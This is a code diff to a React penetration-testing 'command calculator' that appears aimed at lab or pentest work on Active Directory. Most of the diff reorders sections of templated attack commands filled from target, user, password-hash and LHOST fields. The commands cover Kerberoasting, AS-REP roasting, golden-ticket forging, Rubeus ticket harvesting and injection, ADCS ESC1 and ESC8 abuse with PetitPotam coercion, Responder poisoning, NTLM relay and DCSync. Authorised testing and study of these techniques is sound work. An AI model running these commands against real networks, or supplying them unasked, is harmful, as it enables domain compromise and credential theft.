@@ -9,14 +9,14 @@ import { nodes, PHASES } from "./utils/loadNodes";
  */
 
 const FIELDS = [
-  { k: "ip", label: "Target IP", ph: "10.10.10.5", v: "$ip" },
-  { k: "dcip", label: "DC IP", ph: "10.10.10.10", v: "$dc" },
-  { k: "host", label: "Hostname", ph: "dc01.corp.local", v: "$host" },
-  { k: "domain", label: "Domain", ph: "corp.local", v: "$domain" },
-  { k: "user", label: "User", ph: "jdoe", v: "$user" },
-  { k: "secret", label: "Password / Hash", ph: "Password123!", secret: true, v: "$pass" },
-  { k: "lhost", label: "LHOST (tun0)", ph: "10.10.14.7", v: "$lhost" },
-  { k: "lport", label: "LPORT", ph: "4444", v: "$lport" },
+  { k: "ip", label: "Target IP", ph: "10.10.10.5" },
+  { k: "dcip", label: "DC IP", ph: "10.10.10.10" },
+  { k: "host", label: "Hostname", ph: "dc01.corp.local" },
+  { k: "domain", label: "Domain", ph: "corp.local" },
+  { k: "user", label: "User", ph: "jdoe" },
+  { k: "secret", label: "Password / Hash", ph: "Password123!" },
+  { k: "lhost", label: "LHOST (tun0)", ph: "10.10.14.7" },
+  { k: "lport", label: "LPORT", ph: "4444" },
 ];
 // fields that count toward "ready" (lport has a working default, so it's exempt)
 const CORE = ["ip", "dcip", "host", "domain", "user", "secret", "lhost"];
@@ -243,6 +243,47 @@ export default function CommandCalculator() {
         ]},
       ],
     },
+    enum: {
+      name: "Enumeration", groups: [
+        { phase: "SMB / host", cmds: [
+          { label: "nxc smb — host info", cmd: `nxc smb ${IP} ${nxcA()}` },
+          { label: "nxc smb — users", cmd: `nxc smb ${IP} ${nxcA()} --users` },
+          { label: "nxc smb — shares", cmd: `nxc smb ${IP} ${nxcA()} --shares` },
+          { label: "nxc smb — pass policy", cmd: `nxc smb ${IP} ${nxcA()} --pass-pol` },
+          { label: "enum4linux-ng", cmd: `enum4linux-ng -A ${IP} -u ${Q}${U}${Q} -p ${Q}${SEC}${Q}` },
+          { label: "rpcclient (null)", cmd: `rpcclient -U "" -N ${IP}`, note: "Then: enumdomusers, querydispinfo, enumdomgroups." },
+        ]},
+        { phase: "Kerbrute / userlists", cmds: [
+          { label: "kerbrute — userenum", cmd: `kerbrute userenum -d ${D} --dc ${DCIP} users.txt` },
+          { label: "BloodHound (python)", cmd: `bloodhound-python -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} -ns ${DCIP} -c All --zip` },
+        ]},
+      ],
+    },
+    ldap: {
+      name: "LDAP", groups: [
+        { phase: "Connect & recon", cmds: [
+          { label: "rootDSE (anon)", cmd: `ldapsearch -x -H ldap://${IP} -s base -b "" "(objectClass=*)" "*" +` },
+          { label: "All users (authed)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=user)" sAMAccountName description memberOf` },
+          { label: "Computers", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=computer)" dNSHostName operatingSystem` },
+          { label: "windapsearch — DA group", cmd: `windapsearch -d ${D} --dc-ip ${DCIP} -u ${Q}${U}@${D}${Q} -p ${Q}${SEC}${Q} --da` },
+        ]},
+        { phase: "UAC bitmask filters", cmds: [
+          { label: "Kerberoastable (SPN set)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName` },
+          { label: "AS-REP roastable (no preauth)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName` },
+          { label: "Password in description", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(description=*pass*)" sAMAccountName description` },
+        ]},
+      ],
+    },
+    smb: {
+      name: "SMB", groups: [
+        { phase: "Shares", cmds: [
+          { label: "smbmap", cmd: `smbmap -H ${IP} -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D}` },
+          { label: "smbclient — list", cmd: `smbclient -L //${IP}/ -U ${Q}${D}/${U}%${SEC}${Q}` },
+          { label: "smbclient — connect", cmd: `smbclient //${IP}/SHARE -U ${Q}${D}/${U}%${SEC}${Q}` },
+          { label: "nxc — spider shares", cmd: `nxc smb ${IP} ${nxcA()} -M spider_plus` },
+        ]},
+      ],
+    },
     ad: {
       name: "AD Attacks", groups: [
         { phase: "Auth & exec", cmds: [
@@ -265,6 +306,24 @@ export default function CommandCalculator() {
             : `impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP} -request -outputfile tgs.txt` },
           { label: "AS-REP roast (nxc)", cmd: `nxc ldap ${IP} ${nxcA()} --asreproast asrep.txt` },
           { label: "AS-REP roast (impacket, userlist)", cmd: `impacket-GetNPUsers ${D}/ -dc-ip ${DCIP} -usersfile users.txt -no-pass -request -format hashcat -outputfile asrep.txt`, note: "-format hashcat so it cracks with -m 18200." },
+        ]},
+      ],
+    },
+    kerberos: {
+      name: "Kerberos", groups: [
+        { phase: "Tickets", cmds: [
+          { label: "Request TGT", cmd: authMode === "hash"
+            ? `impacket-getTGT ${D}/${U} -hashes :${SEC} -dc-ip ${DCIP}`
+            : `impacket-getTGT ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP}`, note: "Then: export KRB5CCNAME=${U}.ccache" },
+          { label: "Use ccache (-k -no-pass)", cmd: `export KRB5CCNAME=${U}.ccache\nimpacket-psexec -k -no-pass ${D}/${U}@${HOST} -dc-ip ${DCIP}` },
+          { label: "Golden ticket (ticketer)", cmd: `impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ${D} Administrator` },
+        ]},
+        { phase: "Rubeus (on a Windows foothold)", cmds: [
+          { label: "Kerberoast → hashes", cmd: `.\\Rubeus.exe kerberoast /nowrap /outfile:tgs.txt`, note: "Crack with hashcat -m 13100." },
+          { label: "AS-REP roast", cmd: `.\\Rubeus.exe asreproast /nowrap /format:hashcat /outfile:asrep.txt` },
+          { label: "Dump + monitor TGTs", cmd: `.\\Rubeus.exe triage\n.\\Rubeus.exe monitor /interval:5 /nowrap`, note: "monitor harvests tickets as users log in." },
+          { label: "Pass-the-ticket (inject)", cmd: `.\\Rubeus.exe ptt /ticket:BASE64_OR_KIRBI`, note: "Inject a stolen/forged ticket into the current session." },
+          { label: "Overpass-the-hash → TGT", cmd: `.\\Rubeus.exe asktgt /user:${U} /rc4:${SEC} /ptt`, note: "Turn an NT hash into a usable TGT in-session." },
         ]},
       ],
     },
@@ -309,62 +368,32 @@ export default function CommandCalculator() {
         ]},
       ],
     },
-    enum: {
-      name: "Enumeration", groups: [
-        { phase: "SMB / host", cmds: [
-          { label: "nxc smb — host info", cmd: `nxc smb ${IP} ${nxcA()}` },
-          { label: "nxc smb — users", cmd: `nxc smb ${IP} ${nxcA()} --users` },
-          { label: "nxc smb — shares", cmd: `nxc smb ${IP} ${nxcA()} --shares` },
-          { label: "nxc smb — pass policy", cmd: `nxc smb ${IP} ${nxcA()} --pass-pol` },
-          { label: "enum4linux-ng", cmd: `enum4linux-ng -A ${IP} -u ${Q}${U}${Q} -p ${Q}${SEC}${Q}` },
-          { label: "rpcclient (null)", cmd: `rpcclient -U "" -N ${IP}`, note: "Then: enumdomusers, querydispinfo, enumdomgroups." },
+    adcs: {
+      name: "ADCS / Certipy", groups: [
+        { phase: "Find vulnerable templates", cmds: [
+          { label: "certipy find (vuln only)", cmd: `certipy find -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -vulnerable -stdout`, note: "Flags ESC1-16. Start here." },
+          { label: "certipy find (full, hash)", cmd: `certipy find -u ${U}@${D} -hashes :${SEC} -dc-ip ${DCIP} -stdout` },
+          { label: "nxc ADCS module", cmd: `nxc ldap ${IP} ${nxcA()} -M adcs` },
         ]},
-        { phase: "Kerbrute / userlists", cmds: [
-          { label: "kerbrute — userenum", cmd: `kerbrute userenum -d ${D} --dc ${DCIP} users.txt` },
-          { label: "BloodHound (python)", cmd: `bloodhound-python -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} -ns ${DCIP} -c All --zip` },
+        { phase: "ESC1 — request as anyone", cmds: [
+          { label: "Request cert w/ alt SID (DA)", cmd: `certipy req -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -ca CA-NAME -template VULN-TEMPLATE -upn administrator@${D}`, note: "Get CA-NAME + template from 'certipy find'. On patched DCs (May 2022) add -sid <target SID> for the SID extension." },
+          { label: "Auth with the cert → hash/TGT", cmd: `certipy auth -pfx administrator.pfx -dc-ip ${DCIP}`, note: "Returns the NT hash + a TGT for Administrator." },
         ]},
-      ],
-    },
-    ldap: {
-      name: "LDAP", groups: [
-        { phase: "Connect & recon", cmds: [
-          { label: "rootDSE (anon)", cmd: `ldapsearch -x -H ldap://${IP} -s base -b "" "(objectClass=*)" "*" +` },
-          { label: "All users (authed)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=user)" sAMAccountName description memberOf` },
-          { label: "Computers", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=computer)" dNSHostName operatingSystem` },
-          { label: "windapsearch — DA group", cmd: `windapsearch -d ${D} --dc-ip ${DCIP} -u ${Q}${U}@${D}${Q} -p ${Q}${SEC}${Q} --da` },
+        { phase: "ESC8 — relay to web enroll", cmds: [
+          { label: "Relay to CA enrollment", cmd: `impacket-ntlmrelayx -t http://${DCIP}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`, note: "Pair with a coerce (PetitPotam/Coercer) to capture the DC$ cert." },
+          { label: "Coerce the DC", cmd: `python3 PetitPotam.py -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} ${LHOST} ${DCIP}` },
         ]},
-        { phase: "UAC bitmask filters", cmds: [
-          { label: "Kerberoastable (SPN set)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName` },
-          { label: "AS-REP roastable (no preauth)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName` },
-          { label: "Password in description", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(description=*pass*)" sAMAccountName description` },
+        { phase: "Use the result", cmds: [
+          { label: "Pass-the-cert / DCSync", cmd: `impacket-secretsdump -just-dc ${Q}${D}/administrator${Q}@${DCIP} -hashes :RECOVERED_HASH`, note: "Use the NT hash certipy auth returned." },
         ]},
       ],
     },
-    smb: {
-      name: "SMB", groups: [
-        { phase: "Shares", cmds: [
-          { label: "smbmap", cmd: `smbmap -H ${IP} -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D}` },
-          { label: "smbclient — list", cmd: `smbclient -L //${IP}/ -U ${Q}${D}/${U}%${SEC}${Q}` },
-          { label: "smbclient — connect", cmd: `smbclient //${IP}/SHARE -U ${Q}${D}/${U}%${SEC}${Q}` },
-          { label: "nxc — spider shares", cmd: `nxc smb ${IP} ${nxcA()} -M spider_plus` },
-        ]},
-      ],
-    },
-    kerberos: {
-      name: "Kerberos", groups: [
-        { phase: "Tickets", cmds: [
-          { label: "Request TGT", cmd: authMode === "hash"
-            ? `impacket-getTGT ${D}/${U} -hashes :${SEC} -dc-ip ${DCIP}`
-            : `impacket-getTGT ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP}`, note: "Then: export KRB5CCNAME=${U}.ccache" },
-          { label: "Use ccache (-k -no-pass)", cmd: `export KRB5CCNAME=${U}.ccache\nimpacket-psexec -k -no-pass ${D}/${U}@${HOST} -dc-ip ${DCIP}` },
-          { label: "Golden ticket (ticketer)", cmd: `impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ${D} Administrator` },
-        ]},
-        { phase: "Rubeus (on a Windows foothold)", cmds: [
-          { label: "Kerberoast → hashes", cmd: `.\\Rubeus.exe kerberoast /nowrap /outfile:tgs.txt`, note: "Crack with hashcat -m 13100." },
-          { label: "AS-REP roast", cmd: `.\\Rubeus.exe asreproast /nowrap /format:hashcat /outfile:asrep.txt` },
-          { label: "Dump + monitor TGTs", cmd: `.\\Rubeus.exe triage\n.\\Rubeus.exe monitor /interval:5 /nowrap`, note: "monitor harvests tickets as users log in." },
-          { label: "Pass-the-ticket (inject)", cmd: `.\\Rubeus.exe ptt /ticket:BASE64_OR_KIRBI`, note: "Inject a stolen/forged ticket into the current session." },
-          { label: "Overpass-the-hash → TGT", cmd: `.\\Rubeus.exe asktgt /user:${U} /rc4:${SEC} /ptt`, note: "Turn an NT hash into a usable TGT in-session." },
+    relay: {
+      name: "Relay / Poison", groups: [
+        { phase: "Capture & relay", cmds: [
+          { label: "responder", cmd: `sudo responder -I tun0 -wv`, note: "Add -A first to analyze-only (passive); drop -A to actively poison." },
+          { label: "ntlmrelayx (to SMB)", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support` },
+          { label: "coerce (PetitPotam)", cmd: `python3 PetitPotam.py -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} ${LHOST} ${IP}` },
         ]},
       ],
     },
@@ -393,15 +422,6 @@ export default function CommandCalculator() {
             ? `xfreerdp /u:${U} /pth:${SEC} /v:${IP} +clipboard /cert:ignore`
             : `xfreerdp /u:${U} /p:${Q}${SEC}${Q} /v:${TH} +clipboard /cert:ignore` },
           { label: "nxc rdp — check", cmd: `nxc rdp ${IP} ${nxcA()}` },
-        ]},
-      ],
-    },
-    relay: {
-      name: "Relay / Poison", groups: [
-        { phase: "Capture & relay", cmds: [
-          { label: "responder", cmd: `sudo responder -I tun0 -wv`, note: "Add -A first to analyze-only (passive); drop -A to actively poison." },
-          { label: "ntlmrelayx (to SMB)", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support` },
-          { label: "coerce (PetitPotam)", cmd: `python3 PetitPotam.py -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} ${LHOST} ${IP}` },
         ]},
       ],
     },
@@ -535,26 +555,6 @@ export default function CommandCalculator() {
         ]},
         { phase: "sshuttle (quick VPN-like)", cmds: [
           { label: "Route a subnet through SSH", cmd: `sshuttle -r ${U}@${IP} 10.10.20.0/24`, note: "Transparent — no proxychains needed. Target needs python." },
-        ]},
-      ],
-    },
-    adcs: {
-      name: "ADCS / Certipy", groups: [
-        { phase: "Find vulnerable templates", cmds: [
-          { label: "certipy find (vuln only)", cmd: `certipy find -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -vulnerable -stdout`, note: "Flags ESC1-16. Start here." },
-          { label: "certipy find (full, hash)", cmd: `certipy find -u ${U}@${D} -hashes :${SEC} -dc-ip ${DCIP} -stdout` },
-          { label: "nxc ADCS module", cmd: `nxc ldap ${IP} ${nxcA()} -M adcs` },
-        ]},
-        { phase: "ESC1 — request as anyone", cmds: [
-          { label: "Request cert w/ alt SID (DA)", cmd: `certipy req -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -ca CA-NAME -template VULN-TEMPLATE -upn administrator@${D}`, note: "Get CA-NAME + template from 'certipy find'. On patched DCs (May 2022) add -sid <target SID> for the SID extension." },
-          { label: "Auth with the cert → hash/TGT", cmd: `certipy auth -pfx administrator.pfx -dc-ip ${DCIP}`, note: "Returns the NT hash + a TGT for Administrator." },
-        ]},
-        { phase: "ESC8 — relay to web enroll", cmds: [
-          { label: "Relay to CA enrollment", cmd: `impacket-ntlmrelayx -t http://${DCIP}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`, note: "Pair with a coerce (PetitPotam/Coercer) to capture the DC$ cert." },
-          { label: "Coerce the DC", cmd: `python3 PetitPotam.py -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} ${LHOST} ${DCIP}` },
-        ]},
-        { phase: "Use the result", cmds: [
-          { label: "Pass-the-cert / DCSync", cmd: `impacket-secretsdump -just-dc ${Q}${D}/administrator${Q}@${DCIP} -hashes :RECOVERED_HASH`, note: "Use the NT hash certipy auth returned." },
         ]},
       ],
     },
@@ -736,7 +736,7 @@ export default function CommandCalculator() {
         </div>
 
         <div className="var-grid">
-          {FIELDS.map(({ k, label, ph, secret }) => {
+          {FIELDS.map(({ k, label, ph }) => {
             const setq = !!f[k];
             return (
               <div key={k} className="var">
